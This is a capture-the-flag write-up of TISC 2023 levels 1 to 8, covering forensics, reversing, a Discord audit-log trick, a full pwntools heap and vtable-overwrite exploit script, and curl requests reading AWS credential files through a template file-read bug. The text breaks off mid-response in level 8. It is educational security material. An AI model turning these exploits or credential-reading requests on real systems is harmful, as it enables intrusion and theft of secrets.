# TISC 2023 Write Up

## Level 1 - Disk Archaeology
In this challenge, we were provided with challenge.img, which contained ext4 filesystem data.

As this is a forensics challenge, I started off by opening the image file in Autopsy. Once everything has loaded, we were able to see that there is a file of interest, an ELF binary,under the 'Deleted Files' category. 

![autopsy-output](level-1/image.png)

In order to perform further investigation, the ELF binary was extracted from the filesystem image.

![binary-data](level-1/image-1.png)

From this, we can see that there is a string that looks like the flag in the binary, `TISC{w4s_th3r3_s0m3th1ng_l3ft_%s}`, however, it is not the complete flag as there is a string appended to the end of it as evident by `%s`.

When trying to run the binary, an error is encountered.
                        
![binary-error](level-1/image-2.png)

Upon further investigation by running the `ldd` command, we can see that the musl libc is not found on my system.

![binary-missing](level-1/image-3.png)

As such, I downloaded the musl package on my system and used it to run the binary, which yielded the flag :D

![flag-1](level-1/image-4.png)

## Level 2 - XIPHEREHPIX's Reckless Mistake
In this level, we were given a binary named XIPHEREHPIX and its source code, prog.c

By running the binary, we can see that it takes in a password as input, and that it must be at least 40 characters in length. 

Looking at the `main` function in prog.c, we can see that the program verifies the password, then initialises the key and shows the welcome message. 

### Analysing `verify_password`
This function takes in the user's input and the input length, and generates the sha256 hash and compares it against a predefined array of the actual password's sha256 hash value. Attempting to do a database look up for the hash did not yield any results, and there was not much that could be done with this function.

### Analysing `initialise_key`

This function utilizes the password to generate the key which is ultimately used to decrypt the flag.

By analysing the code in this function, it is possible to see that there is no need to find the password. 


```c
    char *seed = "PALINDROME IS THE BEST!";
    int i, j;
    int counter = 0;

    uint256_t arr[20] = { 0 };

    calculate_sha256((unsigned char *) arr, (unsigned char *) seed, strlen(seed));

    for (i = 1; i < 20; i++) {
        calculate_sha256((unsigned char *)(arr+i), (unsigned char *) (arr+i-1), 32);
    }
```

This code block essentially initializes an array of 20 256-bit numbers, since the seed is fixed, the arrary `arr` is also fixed.

```c
    for (i = 0; i < password_length; i++) {
        int ch = password[i];
        for (j = 0; j < 8; j++) {
            counter = counter % 20;

            if (ch & 0x1) {
                accumulate_xor(key256, arr+counter);
            }

            ch = ch >> 1;
            counter++;
        }
    }
```

For every bit in the password, the key is XOR-ed by an element of the array `arr`
However, since we do not know the password, we do not know how many times each value in the array is XOR-ed with the key. 

But based on XOR's self-inverse property where anything XOR-ed with itself evaluates to 0, it is possible to determine that for every element in the array `arr`, the element is either XOR-ed with the sha256 hash of key for an even number of times, or XOR-ed with the sha256 hash of key for an odd number of times.

If it has been XOR-ed an even number of times, it is equivalent to being XOR-ed zero times. If it has been XOR-ed an odd number of times, it is equivalent to being XOR-ed one time. 

As such, there are only `2 ** 20 = 1048576` possible combinations for the key, thus making it bruteforceable. 

Therefore, by modifying `initialise_key` in `prog.c`, we are able to bruteforce the key and decrypt the secret which is the flag.
```c
    for (i = 0; i <= 0xfffff; i++) {
      key256->a0 = 0;
      key256->a1 = 0;
      key256->a2 = 0;
      key256->a3 = 0;
      for (j = 0; j < 20; j++) {
        int ch = (i >> j) & 0x1;
        if (ch) {
          accumulate_xor(key256, arr+j);
        }
      }
        show_welcome_msg((unsigned char*)key256);

    }
```
![flag-2](level-2/image.png)


## Level 3 - KPA
In this level, we are given an APK file, and JEB was used to decompile it.

After decompilation, we are able to see `MainActivity` which contains the main bulk of the code. 

![decompile-main](level-3/image.png)

From this code snippet, we can see that it checks the SHA1 hash of an input string, before performing mathematical operations on each character in a defined character array. It will then print out the secret (flag) that we are looking for. However, based on this information alone, we are unable to determine what the string in the defined character array is supposed to be.

Upon further analysis, we can see that there is an interesting custom library called `libkappa.so`. 

By searching for the string `kappa`, I chanced upon a function that loads a suspicious string from the custom library.

![sus-string](level-3/image-1.png)

With this string, I wrote a script that simulates the actions done in `MainActivity` to get the secret

```py
import math

test = bytearray(b"ArBraCaDabra?KAPPACABANA!")
output = bytearray(25)

output[0] = (test[24] * 2 + 1);
output[1] = ((test[23] - 1) // 4 * 3);
output[2] = test[22];
output[3] = (test[21] + 38);
output[4] = (test[20] // 3) * 5 + 4
output[5] = (test[19] - 1);
output[6] = (test[18] + 49);
output[7] = (test[17] + 18);
output[8] = ((test[16] + 19) // 3);
output[9] = (test[15] + 37);
output[10] = (test[14] + 50);
output[11] = ((test[13] // 5 + 1) * 3);
output[12] = (((test[12] // 9) + 5) * 9);
output[13] = (test[11] + 21);
output[14] = (test[10] // 2 - 6);
output[15] = (test[9] + 2);
output[16] = (test[8] - 24);
output[17] = (test[7] + 16);
output[18] = ((test[6] - 9) // 2);
output[19] = (test[5] + 8);
output[20] = test[4];
output[21] = (test[3] - 34);
output[22] = (test[2] * 2 - 20);
output[23] = (test[1] // 2 + 8);
output[24] = ((test[0] + 1) // 2);

print(output)            
```

![flag-3](level-3/image-2.png)

## Level 4 - Really Unfair Battleships Game
For this level, we were given a game and that we would only be given the flag after achieving `Flawless Victory`. 

To start, I tried reverse engineering the application - but it was too complicated and felt like a giant rabbit hole. Furthermore, they gave both an AppImage, and an exe file, which made me feel like it was not meant to be reverse engineered. 

After playing the game for awhile, I noticed that there was a brief message that says `Testing connection to the server` when opening the game. This shows that the game file was interacting with an external server for certain functionalities. Thus, I used wireshark to try and inspect some of the network traffic. 

![wireshark-capture](level-4/image.png)

Using wireshark, I noticed that it was making a HTTP GET request to /generate on an external server `rubg.chals.tisc23.ctf.sg:34567`. So I did what any sane person would do and connected to it from my end. 

![generate-webpage](level-4/image-1.png)

From this, I made a guess that `/generate` generates the location of the ship. 
In order to test my hypothesis, I coded a python http server to simulate the server. 

```py
from flask import Flask, request, render_template

app = Flask(__name__, template_folder='.')

@app.route('/')
def index():
    return '"pong"'

@app.route('/generate')
def generate():
    return '{"a":[0,0,0,16,0,16,0,16,0,16,0,0,0,32,0,32,0,0,0,0,0,0,0,62,0,64,0,64,0,112,0,0],"b":"3005568112221810855","c":"16214320127859333810","d":1900927155}'

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=34567, debug=True)
```

Then, I changed the `/etc/hosts` file on my local machine to redirect all requests to `rubg.chals.tisc23.ctf.sg` to my localhost so that I would be interacting with my own generated server instead.

This time when I ran the game, I was able to find out that all the ships were located in the same boxes. By bruteforcing, I was able to get a `Victory`. However, there was no flag because of the `Flawless Victory` requirement. 

At this point, I did not know what it meant to get a `Flawless Victory`. After much frustration and modifications to `server.py`, I was able to make it such that there was only one ship on the board. By clicking that, I was able to get a `Flawless Victory`. 

```py
def generate():
    return '{"a":[0,0,0,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],"b":"3005568112221810855","c":"16214320127859333810","d":1900927155}'
```
![solve-post](level-4/image-2.png)

I was also able to get more information regarding the HTTP request made when a `Flawless Victory` is achieved. I also realised that every bit in the `a` array, corresponds with a battleship, and enables the boxes accordingly. 

Based on this, I modified the code to enable more boxes, and by clicking them in a specific order, I was able to get a `Flawless Victory`.

This led me to realise that to achieve `Flawless Victory`, we would be required to click the boxes in a specific order. 

### Hours of pain and suffering (from 'educated' guessing - it worked right :shrug:) 
_just many many many hours of clicking random boxes to find patterns_
![pain](level-4/image-3.png)

To start begin my suffering, I enabled the boxes one at a time, recording the order in which the boxes should be clicked to get a `Flawless Victory`. After a few (read: many) rounds of clicking, I began to notice a pattern.

The order of the boxes remained the same even if a new box was enabled, so it worked somewhat like an insertion sort. So it began my sanity loss and many hours of clicking as evident in the above image of my MSPaint adventures and writing numbers in ascending order as I slowly increased the number of boxes. 

I repeated this until I managed to find the correct order for every single box.

_only 1+2+3+4+5+6+7+8+9+10+11+12+13+14+15+16 tries required right?_

BUT I DID IT :D and got the flag by sending the final solution to the server. 
![flag-4](level-4/image-4.png)

_*in hindsight i probably could have gotten the corresponding hex values of each box and sorted it before sending it to the server instead T_T_


## Level 5 - PALINDROME's Invitation
In this level, we were provided a link to a github repository called 'PALINDROME-PORTAL'.

By poking around, we are able to see past commits and actions taken in the repository. From the commits, we are able to see a code snippet of the jobs ran to test the portal. 

![portal-code](level-5/image.png)

From this snippet, we are able to see that they connect to the portal using PORTAL_URL and PORTAL_PASSWORD, which is unknown to us. However, if we were to take a look at the actions tab under a job named test, we are able to see a DEBUG log, containing a URL, and a string that matches the regex from the wget command.

![portal-debug-log](level-5/image-1.png)

By attempting to access the URL, we gain access to a website titled 'PALINDROME member portal', however, we would require a password to enter the portal.
![member-portal](level-5/image-2.png)

Looking back at the string we got from the log output, I first tried to use the string as the password to login directly, but it did not work. I was stuck here for awhile as I was not sure what to do with the string. Upon further head banging, I realised that the password could have been URL encoded since the wget tool was used. 

Using the URL decoded string `:dIcH:..uU9gp1<@<3Q"DBM5F<)64S<(01tF(Jj%ATV@$Gl`, I was able to gain access to the portal. There was a discord invite link and a token, which was unfamiliar to me. 
![portal-welcome](level-5/image-3.png)

After reading up on discord tokens and its usage, I was able to write a script to enumerate some basic information based on the limited actions we could do upon joining the discord server via the invite link. 

By looking through the threads in the server, one message of interest was a conversation between Yor and Anya, about an Invitation to Anya's Birthday Party, a discord user ID pointing to the 'BetterInvites' Discord bot and something to do with the permission code '66688'. 

Well, what does the 'BetterInvites' bot do, and how would it be useful in gaining access to secret channels? Looking up the BetterInvites bot, we can see that it is able to assign new members a role when they join using a specific invite. The next question would then be how are we going to get access to other invite links that can give us the role that we are looking for? With this in mind, I searched up the discord permissions specified, and was able to see that those with a permission code of '66688' are able to view channels, audit logs, and read message history.

![discord-perms](level-5/image-4.png)

Being able to access audit logs allows us to view actions that were made in the server, which includes and is not limited to, actions like deleting messages, user join messages, and the creation of invite links - which happens to be what we are looking for.

Then, by enumerating the audit logs, we are able to get a list of invites and with a bit of bruteforcing, the invite that works leads us to the flag channel, giving us the flag :D 


## Level 6 - 4D
For this level, we were given a binary, `4d`, and access to a webpage that has a 4d number generator. 

To start, static analysis was done on the binary. Opening it in IDA, I was able to see that there are only a few key functions, mainly those that were associated with `main`. 

![main-funcs](level-6/image.png)

As the code for this binary was written in vlang, it was quite hard to understand the binary decompilation as it is a very unfamiliar language. To help understand the context of the code better, I looked up some sample [code](https://github.com/vlang/v/blob/master/vlib/vweb/vweb.v), which was able to give me more context when reversing the binary, and helped eliminate a lot of noise/default functions that are required for the application to run. As such, I was able to focus my efforts on reversing the key main functions. 

Through further analysis, I was able to find out that upon connecting to the web server, a series of functions are called, and the user is able to specify an input through a handler, and certain functions like `main__compare` and `main_decrypt` are performed on the user's input string. 

### Analysing `vweb__handle_route_T_main__App`

From this function, we can identify the routes that are registered by the web service.

By analysing this function, we are able to see that we can make a POST request to the server to give a customised input. The POST route was defined as `/:inpt` and we are able to submit any input by making a POST request to `http://chals.tisc23.ctf.sg:48471/<custom string>`, where the binary will then process by passing it to the `main__App_handle_inpt` function.

We are also able to see that we can make a GET request to `/get_4d_number` which calls the `main__App_get_4d_number`.

### Analysing `main__App_get_4d_number`
From this function, we can see that the application tracks sessions through cookie values, and uses a function called `map_get_check`. However, I did not know what `map_get_check` does, and I was not sure if it would affect the subsequent steps. 

To figure out what `map_get_check` does, I did some dynamic analysis to see what happens.
![map-get-check-contents](level-6/image5.png)
![map-get-check-contents-2](level-6/image6.png)

Based on the above images, we can see that our session cookie `id` is passed into the `map_get_check` function and the function returns a string in the form of an array.

After experimenting and playing around, we realize that we can modify this value via the `handle_inpt` function. In order to test this, a dummy request was sent.

```sh
level-6 ➜ curl -XPOST 'http://box.caprinux.com:12345/test_test' -H 'Cookie: id=28d96b3d-a48c-4d9e-98e0-07b91dfe32c9'                                                                                    
Received test_test!
```

![output-aft-modifying-value](level-6/image7.png)

Upon further analysis, we can see that the value sent in the dummy request is reflected in the string returned by `map_get_check`

From this, we can see that our input will be mapped directly to our cookie `id`.

This function is also where `main__compare` is called to perform checks on the user's input. However, before `main__compare` is called, the user's input goes through some manipulation.

![code-snippet](level-6/image-2.png)

Based on this code snippet, given the user's input string,
1. +5 to every element in the string
2. XOR current element with next index number
3. XOR current element with previous element

At the end of this loop, the manipulated user's input is then passed to `main_compare`

### Analysing `main__compare`
In this function, we can see that it checks whether a variable's length is 32, then performs a series of checks for each character in the variable string. 

![main-compare-snippet](level-6/image-1.png)

In this case, the variable being checked is the user's input.

By putting these values into an array, we get `arr = [106, 1, 100, 45, 94, 96, 23, 46, 117, 40, 17, 104, 43, 19, 84, 110, 37, 104, 40, 0, 63, 87, 59, 126, 91, 20, 120, 28, 87, 22, 110, 118]`, which is the expected values of the string after going through the string manipulation in `main__App_get_4d_number`

### Generating expected user input
With this information, it is possible to write a script that outputs the expected string from the user input.

```
arr = [106, 1, 100, 45, 94, 96, 23, 46, 117, 40, 17, 104, 43, 19, 84, 110, 37, 104, 40, 0, 63, 87, 59, 126, 91, 20, 120, 28, 87, 22, 110, 118]

test = [0]*32
test[0] = 106

for i in range(1, 32):
    test[i] = arr[i] ^ arr[i-1]

for j in range(32):
    test[j] = test[j] ^ (j+1)

for k in range(32):
    test[k] -= 5

print(test)

string = ''
for i in test:
    string += chr(i)

print(string)
```

Since we know that we can make a POST request with a custom input, and that it is tracked by our cookie `id`, we can now submit the expected string input that can pass the checks implemented by the app.

The string output is first URL encoded, before a POST request is submitted using the `id` cookie extracted from the webpage
`curl -XPOST 'http://chals.tisc23.ctf.sg:48471/fdaHq3k%2CMR%2DpI1C%25UZN7%25yvX7PrsQZb3' -H 'Cookie: id=90d62efc-6268-4612-982a-d4b5113b364e'`

![curl-output](level-6/image-4.png)

After refreshing the webpage, the flag appears :D

![flag-6](level-6/image-3.png)

## Level 7 - The Library
In this level, we were given an ELF binary, which is a Library Planning Application.

![main-menu](level-7/image.png)

From interacting with the binary, we are able to see that there are many functions in the program, which led me to start on static analysis.

### The start of my suffering
As the binary was compiled without any symbols, the decompilation was really hard to read and understand. Thus began my long journey of renaming functions, creating custom structs within structs and so on.

This took days of pain :(

As there is a lot of functionality within the program, I have narrowed down the scope of my write up to only include the functionalities that I have used in order to exploit the program.

### Initial Analysis
I started by checking if there were any protections enabled.
```
level-7 ➜ checksec TheLibrary.elf
[*] '/home/vela/level-7/TheLibrary.elf'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

After poking around and looking through all the functions, we are able to find what seems like a `win()` function, which seems to be our objective. However, this function does not seem to be called anywhere. Since there are many vtables that contain function pointers, there could possibly be a way to overwrite the vtable function pointers to call the `win()` function instead.

However, we can also note that since PIE protection is enabled, we might have to leak a binary address in order to find the address of the `win()` function.

```c
__int64 win()
{
  __int64 v0; // rax
  __int64 v1; // rax
  _QWORD *line; // rax
  char v4[256]; // [rsp+0h] [rbp-240h] BYREF
  __int64 v5; // [rsp+100h] [rbp-140h] BYREF
  char v6[40]; // [rsp+210h] [rbp-30h] BYREF

  std::init_string(v6);
  std::ifstream::basic_ifstream(v4, "1eb6ad8048df347da1f0d6892b3a4d4e494b84cd.txt", 8LL);
  if ( (unsigned __int8)std::ios::operator!(&v5) )
  {
    v0 = print(&output, "The file does not exist");
    print_new_line(v0, &new_line);
  }
  else
  {
    while ( 1 )
    {
      line = (_QWORD *)get_line((__int64)v4, (__int64)v6);
      if ( !(unsigned __int8)std::ios::operator bool((char *)line + *(_QWORD *)(*line - 24LL)) )
        break;
      v1 = std::operator<<<char>(&output, v6);
      print_new_line(v1, &new_line);
    }
  }
  std::ifstream::close(v4);
  std::ifstream::~ifstream(v4);
  return destroy_basic_string(v6);
}
```
With all this in mind, we can move on to the main bulk of the exploit.

### Memory Assignment
At the start of the program, it allocates 2 large chunks of memory that are used by the program, which are respectively used to store metadata and userdata as shown in the code block below.

```c
  metadata = malloc(0x25000uLL);                // metadata mem alloc
  if ( metadata )
    memset(metadata, 0, 0x25000uLL);
  for ( i = 0; i <= 0x24F; ++i )
    *(_DWORD *)((char *)metadata + (int)(i << 8)) = 1; //sets in use bit for all 
                                                       //0x250 metadata chunks
  userdata = malloc(0x50000uLL);                // userdata mem alloc
  if ( userdata )
    memset(userdata, 0, 0x50000uLL);
  mem_used = 0;
```

From here, we can see that the metadata block is further broken down into `0x250` blocks of memory. This memory is mainly used by the program to store function metadata. 

Something interesting here is that for each metadata block, the first bit is set to be `1`, which signifies that the memory is not currently in use or occupied. 

When memory is "freed" after being in use, the in use bit is set back to 1, and the data is not deleted.

This is how memory from the metadata block is allocated:
```c
__int64 check_allocate_mem_space()
{
  __int64 v0; // rax
  unsigned int v2; // eax
  unsigned int i; // [rsp+Ch] [rbp-4h]

  for ( i = 0; ; ++i )
  {
    if ( i > 591 )
    {
      v0 = print(&output, "Allocations have been maxed out, please free up space");
      print_new_line(v0, &new_line);
      return 0xFFFFFFFFLL;
    }
    v2 = rand();
    if ( *((_DWORD *)metadata + 0x40 * (v2 % 0x250)) == 1 )// only returns memory that is not in use 
      break;
  }
  return (v2 % 0x250) << 8;
}
```

As we can see, it randomly allocates a free block of memory using the `rand()` function. 

Fortunately, the `rand()` value is predictable since we can reproduce the seed by running in parallel with the program as it uses the current time as the seed.

```c
  seed = time(0LL);
  srand(seed);
```

### Library Name and Motto (memory leak)
At the start of the program, we are asked to set the `name` and `motto` of the Library, which is allocated to the metadata block. We can then later edit the `name` and `motto` through the menu interface after setting it. When editing the library name and motto, the previous metadata block is freed, and a new block is allocated to store the new `name` and `motto`.

This is the only part of the metadata block which saves and stores user input. 

```c
    v8 = print(&output, "[Name & Motto] The following are your chosen name and motto");
    print_new_line(v8, &new_line);
    print(&output, "  [Name]: ");
    for ( i = 0; i <= 15; ++i ) //loops through and prints 16 characters
    {
      v11 = details->name[i];
      print_char(&output, (unsigned int)v11);
    }

    print_new_line(&output, &new_line);

    print(&output, "  [Motto]: ");
    for ( j = 0; j <= 47; ++j ) //loops through and prints 48 characters
    {
      v11 = details->motto[j];
      print_char(&output, (unsigned int)v11);
    }
    print_new_line(&output, &new_line);
```

The above code snippet will loop and print the specified number of characters from the memory block. This is quite unusual as the the printing of characters does not terminate at a null byte. With the way memory is assigned and freed in this program, it might be possible for the printing to leak other stuff in memory that is unintended. 

### Solution script part 1
With the information so far, since we are able to predict the `rand` values, it would be possible for us to leak heap addresses by placing addresses in a block of memory, free it, then reassign the memory to library and motto, so that the addresses will be leaked when the program prints the name and motto back to us.

So the first step here is to generate an array of `rand()` values, and find the first value to be duplicated. 

```py
# try to get same seed as the program
libc.srand(libc.time(0))
predict_rand_arr = []
while True:
    predict_rand_arr.append(libc.rand() % 0x250)
    # keep getting rand values until we have duplicate values
    # so we can get two things to the same place
    if len(predict_rand_arr) > len(set(predict_rand_arr)):
        break

dup_val = predict_rand_arr[-1]

for i in range(len(predict_rand_arr) - 1):
    if predict_rand_arr[i] == dup_val:
        val_idx = i

dup_idx = len(predict_rand_arr) - 1
```

The above code block allows us to find the indexes of the duplicated values, which indicates the number of times we need to allocate memory in order to get allocated the same memory block 2 times. 

Afterwards, using the index values, we can allocate newspaper metadata to the first occurrence of the duplicate index, then free it so that there will be heap addresses left in the memory block. This allows us to be reallocated the same block of memory when we call set name and motto at the duplicate index, and leak the heap addresses.

After some testing, I ended up with this code block which managed to leak the heap address. 

```py
from pwn import *
import ctypes

libc = ctypes.CDLL("libc.so.6")

context.binary = elf = ELF("./TheLibrary.elf")
#p = process("./TheLibrary.elf")
p = remote("chals.tisc23.ctf.sg", 26195)

# try to get same seed as the program
libc.srand(libc.time(0))
predict_rand_arr = []
while True:
    predict_rand_arr.append(libc.rand() % 0x250)
    # keep getting rand values until we have duplicate values
    # so we can get two things to the same place
    if len(predict_rand_arr) > len(set(predict_rand_arr)):
        break

dup_val = predict_rand_arr[-1]

for i in range(len(predict_rand_arr) - 1):
    if predict_rand_arr[i] == dup_val:
        val_idx = i

dup_idx = len(predict_rand_arr) - 1

p.sendlineafter(b"characters): ", b"a")
p.sendlineafter(b"characters): ", b"b")

for i in range(val_idx):
    p.sendlineafter(b"choice: ", b"1")
    p.sendlineafter(b"characters): ", b"a")
    p.sendlineafter(b"characters): ", b"b")

# newspaper stand to put stuff on the metadata block
p.sendlineafter(b"choice: ", b"3")
p.sendlineafter(b"option: ", b"1")
p.sendlineafter(b"characters)\n", b"a")
p.sendlineafter(b"option: ", b"3")
p.sendlineafter(b"remove\n", b"0")
p.sendlineafter(b"option: ", b"5")

for i in range(dup_idx - val_idx - 2):
    p.sendlineafter(b"choice: ", b"1")
    p.sendlineafter(b"characters): ", b"a")
    p.sendlineafter(b"characters): ", b"b")

p.sendlineafter(b"choice: ", b"1")
p.sendlineafter(b"characters): ", b"a")
p.sendlineafter(b"characters): ", b"b")
p.recvuntil(b"Name]: ")


heap_leak = u64(p.recvline()[8:16]) # leak an address from within the user data block
print(hex(heap_leak))
```

### Uninitialised CD/DVD rows
```c
struct cd_dvd_stand
{
  _DWORD in_use;
  _QWORD vtable_ptr;
  _QWORD next_ptr;
  _QWORD prev_ptr;
  cd_dvd_row *row[5];
};

struct cd_dvd_row
{
  _DWORD cd_dvd_num;
  _DWORD idk;
  _DWORD max_per_row;
  _QWORD serial[5];
};
```
Each CD/DVD stand contains up to 5 rows, and each row contains up to 5 CD/DVDs.

```c
v5 = check_allocate_mem_space();
cd_dvd_node = (cd_dvd_stand *)((char *)metadata + v5);
cd_dvd_node->in_use = 0;
cd_dvd_node->row[0] = (cd_dvd_row *)((char *)userdata + (unsigned int)mem_used);
cd_dvd_node->row[0]->cd_dvd_num = 0;
cd_dvd_node->row[0]->max_per_row = 5;
```
From this, we can see that they only initialise and allocate memory for the first row in the CD/DVD stand. Since the other rows are uninitialised, we can possibly spoof a fake row pointer to trick the program into thinking that there are additional rows even if there are not.

After we spoof a CD/DVD row, we can add, remove and list CD/DVD from the spoofed row. If we look into each of these functions, add and list CD/DVD functions conducts a check on whether the memory being written or read from is within the userdata block. If it is not within the userdata block, it will not do anything. This makes it more complicated as we are unable to directly leak the vtable pointer from the metadata block.

What the remove function does is that if a disk is removed, the remaining disks will move up the memory block and overwrite the original space, which is a property that we can make use of.

### Brochure stand exploit strategy

A feasible candidate to carry out our exploit with would be the brochure stand. 

With the brochure stands, we are able to create multiple brochure stands, which are able to hold many brochures. For each brochure stand, memory is allocated from the userdata buffer to store the brochure buf struct as shown below.

From the brochure stand, we are able to add, remove, swap and list brochures based on the `current` and `max` number of brochures defined in brochure buf. 
```c
struct brochure_stand_entry
{
  int in_use;
  _BYTE gap_4[4];
  __int64 vtable;
  brochure_buf *buf;
  _QWORD *next_ptr;
  _QWORD prev_ptr;
};

struct brochure_buf
{
  char header[32];
  int cur;
  int pad;
  int max;
  int pad2;
  char brochures[16][16];
};
```
As the brochure buf is within the userdata block, we can link it with the CD/DVD stand and manipulate the data from there. 

We can fake our CD/DVD row within the brochure buf `header` in order to manipulate the `current` and `max` values, which could in turn allow us to list and swap brochures at large indexes. Since the userdata block is allocated before the metadata block, if the brochure index is large enough, it is possible to swap the userdata values with values in the metadata block - which is our target as we will be able to leak function pointers from the vtable that can be used to calculate the address of our `win()` function.


### Solution script part 2
```py
predict_rand_arr = []
while True:
    predict_rand_arr.append(libc.rand() % 0x250)
    if len(predict_rand_arr) > len(set(predict_rand_arr)):
        break
dup_val = predict_rand_arr[-1]
for i in range(len(predict_rand_arr) - 1):
    if predict_rand_arr[i] == dup_val:
        val_idx = i
dup_idx = len(predict_rand_arr) - 1

for i in range(dup_idx):
    p.sendlineafter(b"choice: ", b"1")
    p.sendlineafter(b"characters): ", b"a"*15)
    p.sendlineafter(b"characters): ", b"aaaaaaaa"+p64(heap_leak+536)) # (heap_leak + 536) points to our brochure stand in the userdata block
    # it is also the fake cd/dvd row pointer 

p.sendlineafter(b"choice: ", b"4")
p.sendlineafter(b"option: ", b"1")
p.sendlineafter(b"option: ", b"5")


p.sendlineafter(b"choice: ", b"5")
p.sendlineafter(b"option: ", b"1")

# fake cd row in brochure stand header
p.sendlineafter(b"characters)\n", p32(50)+p32(0)+p32(50)) # contents of the cd/dvd row metadata, fake number of cd/dvds and max number of cd/dvds

# fake brochure curr max
p.sendlineafter(b"option: ", b"2")
p.sendlineafter(b"edit: \n", b"1")
p.sendlineafter(b"option: \n", b"2")
p.sendlineafter(b"added\n", p32(35000)+p32(0)+p32(0)+p32(0)) # add to brochure contents, which will eventually override max brochure value
p.sendlineafter(b"option:", b"7")
p.sendlineafter(b"option:", b"5")
p.sendlineafter(b"choice:", b"4")

# edit cd dvd stand to remove cd
# move the 35000 into max brochure value
p.sendlineafter(b"option:", b"2")
p.sendlineafter(b"edit:", b"1")
p.sendlineafter(b"option:", b"4")
p.sendlineafter(b"Stand", b"2")
p.sendlineafter(b"removed", b"00000000")
p.sendlineafter(b"option:", b"4")
p.sendlineafter(b"Stand", b"2")
p.sendlineafter(b"removed", b"00000000")
p.sendlineafter(b"option:", b"7")
p.sendlineafter(b"option:", b"5")

p.sendlineafter(b"choice:", b"5")
p.sendlineafter(b"option:", b"2")
p.sendlineafter(b"edit:", b"1")
p.sendlineafter(b"option:", b"5")

# start getting leak from here
while True:
    leek = p.recvline()
    # hacky way to search for brochure add title vtable entry
    # guess and check and pray
    if b"\x55" in leek and b"\x4C" in leek:
        id_1 = int(leek.split()[1][:-2])
        print(leek)
        break

leek = u64(leek.split(b": ")[1][8:16][::-1])
base = leek - 29516 # offset
print(f"vtable leak @ {hex(leek)}")
print(f"elf base @ {hex(base)}")
win = base + 0x8054 # offset can be found from static analysis
print(f"win @ {hex(win)}")
```

From the above code block, after spoofing a large max number of brochures, we are able to leak values from the metadata block, which allows us to leak some of the function pointers, which in turn allows us to calculate our `win()` function address. 

Finally, in order to call `win()`, we want to overwrite a vtable function pointer with the `win()` address via the swap brochure function. We can do this by placing the `win()` address in the metadata block using the library name and motto and then swapping it with a vtable function pointer.

### Last part of solution script
```py 
p.sendlineafter(b"option:", b"7")
p.sendlineafter(b"option:", b"5")

# put win address in library name and motto
p.sendlineafter(b"choice: ", b"1")
p.sendlineafter(b"characters): ", b"a")
p.sendlineafter(b"characters): ", p64(win)[::-1] + b"\xde\xad") # marker to find brochure id for win address more easily

# now we want to find library index
p.sendlineafter(b"choice:", b"5")
p.sendlineafter(b"option:", b"2")
p.sendlineafter(b"edit:", b"1")
p.sendlineafter(b"option:", b"5")

# hacky way to look for our win address
while True:
    leek = p.recvline()
    if b"\xde\xad" in leek:
        id_2 = int(leek.split()[1][:-2]) - 1
        break

print(id_1, id_2) # brochure ids to swap

p.sendlineafter(b"option:", b"4")
p.sendlineafter(b"swap", str(id_1).encode())
p.sendlineafter(b"swap", str(id_2).encode())

# call win address as it is now swapped with the function ptr of add brochure
p.sendlineafter(b"option:", b"7")
p.sendlineafter(b"option:", b"5")
p.sendlineafter(b"choice:", b"5")
p.sendlineafter(b"option:", b"1")
p.sendlineafter(b"characters)", b"a")
p.sendlineafter(b"option:", b"2")
p.sendlineafter(b"edit", b"1")
p.sendlineafter(b"option:", b"2")

p.interactive()
```
After running my script a couple of times, we get the flag :D
![flag-7](level-7/image-1.png)

## Level 8 - Blind SQL Injection
In this level, we were given 3 files, Dockerfile, server.js and db-init.sql, and access to a web page.

Opening the web page, we can see that it is a login portal to a Reminder App. As there is nothing much to work with, I took a look at server.js. 

```js
AWS.config.getCredentials((err) => {
    if (err) console.log(err.stack);
    // TODO: Add more comments here
    else {
        console.log("Access key:", AWS.config.credentials.accessKeyId);
        console.log("Region:", AWS.config.region);
    }
});

app.post('/api/submit-reminder', (req, res) => {
    const username = req.body.username;
    const reminder = req.body.reminder;
    const viewType = req.body.viewType;
    res.send(pug.renderFile(viewType, { username, reminder }));
});
```
From the code above, we can see that AWS credentials are stored and in use on the server. The POST route to `/api/submit-reminder` is also quite interesting as it allows us to read files on the server. 

Since there are AWS credentials stored on the server, I wondered if it would be possible to extract them through reading the configuration file. 

### AWS Enumeration
From the Dockerfile, we can see that the AWS configuration files are stored in the `/root/.aws` directory. By searching for default AWS configuration files, we can find that there are 2 files that are commonly found, `config` and `credentials`. By reading these 2 files with a POST request to `/api/submit-reminder`, we are able to get the AWS server credentials and information. I was able to get the AWS server `region`, `aws_access_key_id` and `aws_secret_access_key`.

```sh
level-8 ➜ curl -XPOST "http://chals.tisc23.ctf.sg:28471/api/submit-reminder" --data "viewType=/root/.aws/config"
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Error: /root/.aws/config:1:1<br> &nbsp;&gt; 1| [default]<br>-------^<br> &nbsp; &nbsp;2| region = ap-southeast-1<br> &nbsp; &nbsp;3| <br><br>unexpected text &quot;[defa&quot;<br> &nbsp; &nbsp;at makeError (/app/node_modules/pug-error/index.js:34:13)<br> &nbsp; &nbsp;at Lexer.error (/app/node_modules/pug-lexer/index.js:62:15)<br> &nbsp; &nbsp;at Lexer.fail (/app/node_modules/pug-lexer/index.js:1629:10)<br> &nbsp; &nbsp;at Lexer.advance (/app/node_modules/pug-lexer/index.js:1694:12)<br> &nbsp; &nbsp;at Lexer.callLexerFunction (/app/node_modules/pug-lexer/index.js:1647:23)<br> &nbsp; &nbsp;at Lexer.getTokens (/app/node_modules/pug-lexer/index.js:1706:12)<br> &nbsp; &nbsp;at lex (/app/node_modules/pug-lexer/index.js:12:42)<br> &nbsp; &nbsp;at Object.lex (/app/node_modules/pug/lib/index.js:104:9)<br> &nbsp; &nbsp;at Function.loadString [as string] (/app/node_modules/pug-load/index.js:53:24)<br> &nbsp; &nbsp;at compileBody (/app/node_modules/pug/lib/index.js:82:18)</pre>
</body>
</html>

level-8 ➜ curl -XPOST "http://chals.tisc23.ctf.sg:28471/api/submit-reminder" --data "viewType=/root/.aws/credentials"
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
